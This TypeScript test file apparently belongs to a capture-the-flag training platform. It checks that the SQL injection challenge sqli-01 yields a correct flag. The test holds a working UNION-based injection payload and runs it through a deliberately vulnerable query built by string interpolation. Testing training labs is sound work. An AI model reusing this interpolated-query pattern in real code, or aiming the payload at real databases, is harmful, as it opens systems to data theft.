/**
 * End-to-end check that SQLi challenge sqli-01 actually delivers an
 * extractable, correct flag:
 *   1. initDb() seeds products + challenge_flags (deterministic flags)
 *   2. a UNION injection against sqli-01's REAL vulnerable query exfiltrates it
 *   3. the extracted value equals generateFlag('sqli-01')
 *
 * Run: PG_* + FLAG_SECRET env, then `npx ts-node tests/sqli_flag_delivery.ts`
 * Exits non-zero on failure.
 */
import assert from 'assert';
import { initDb, query, pgPool } from '../src/services/db';
import { generateFlag } from '../src/utils/flag';

async function main() {
  await initDb();

  // sqli-01's actual query is: SELECT * FROM products WHERE id = '${id}'
  // products has 8 columns; put the text flag in the `name` slot.
  // products.id is an integer, so the quoted comparison needs a numeric
  // prefix (Postgres won't cast '' to int) before breaking out with UNION.
  const injection =
    "1' UNION SELECT NULL, flag, NULL, NULL, NULL, NULL, NULL, NULL " +
    "FROM challenge_flags WHERE challenge_id='sqli-01' -- ";
  const result = await query(`SELECT * FROM products WHERE id = '${injection}'`);

  const expected = generateFlag('sqli-01');
  const extracted = result.rows.map((r: any) => r.name).filter(Boolean);

  assert(
    extracted.includes(expected),
    `flag not extractable via SQLi. expected ${expected}, got ${JSON.stringify(extracted)}`,
  );
  console.log(`PASS: sqli-01 UNION injection extracted ${expected}`);
  await pgPool.end();
}

main().catch((e) => {
  console.error('FAIL:', e.message);
  process.exit(1);
});
